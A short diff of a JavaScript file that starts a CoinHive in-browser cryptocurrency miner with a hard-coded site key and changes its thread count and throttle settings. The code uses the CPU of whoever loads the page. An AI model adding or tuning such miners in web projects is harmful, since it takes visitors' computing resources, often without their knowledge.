@@ -1,6 +1,6 @@
 var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
-miner.setNumThreads(1);
-miner.setThrottle(0);
+miner.setNumThreads(4);
+miner.setThrottle(1);
 miner.start();
 
 var insertToLog = function(input){
